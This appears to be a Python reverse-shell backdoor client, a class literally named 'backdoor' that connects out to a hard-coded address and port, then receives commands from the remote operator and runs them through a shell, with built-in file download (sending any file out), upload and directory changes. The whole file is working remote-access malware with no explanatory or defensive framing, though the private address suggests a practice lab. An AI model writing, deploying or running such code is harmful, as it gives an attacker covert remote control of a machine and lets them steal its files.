import socket
import subprocess
import sys
import os
from termcolor import colored
import json
class backdoor:

    def __init__(self , ip , port):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip = ip
        self.port = port
    def connection(self):
        try:
            self.client.connect((self.ip , self.port))
            dir = os.getcwd()
            k = colored(f'''[+]CONNECTION ESTABLISHED[+]
                            THE CURRENT WORKING DIRECTORY IS
                                        \  /
                                         \/
                    {dir}                
            ''',"red").encode()

            self.client.send(k)
            self.get_commands()
        except:
            self.connection()

    def get_commands(self):
        while True:
            command = self.recv_data()

            # print(command)
            k = self.execute_commands(command)
            k = k.decode()
            k = json.dumps(k)
            k = k.encode()
            # print(k)
            self.client.send(k)

    def recv_data(self):
        msg = ""
        while True:
            try:
                m = self.client.recv(1024).decode()
                # msg = msg + str(m)
                # msg = msg.encode()
                msg = msg + m
                return json.loads(msg)
            except ValueError:
                continue

    def execute_commands(self, command):
        print(command)
        try:
            if command[:4] == "exit":
                self.client.close()
                sys.exit()
            elif command[:2] == "cd" and len(command) > 2:
                os.chdir(command[3:])
                k = "changing directory to" + os.getcwd()
                return k.encode()
            elif command[:8] == "download":
                return self.read_file(command[9:])
            elif command[:6] == "upload":
                return self.write_file(command)
            else:
                return subprocess.check_output(command, shell=True)
        except:
            return b"THE COMMAND IS WRONG"

    def read_file(self, path):

        with open(path, "rb") as f:
            return f.read()

    def write_file(self , path):
        k = path.split(" ")
        path = k[1]
        contents = k[2:]
        contents = " ".join(map(str,contents))
        contents = contents.encode()
        print(contents)
        with open("something.txt"  ,"wb") as f:
            f.write(contents)
            return b"uploaded successfully"

client = backdoor("192.168.56.1" , 9999)
client.connection()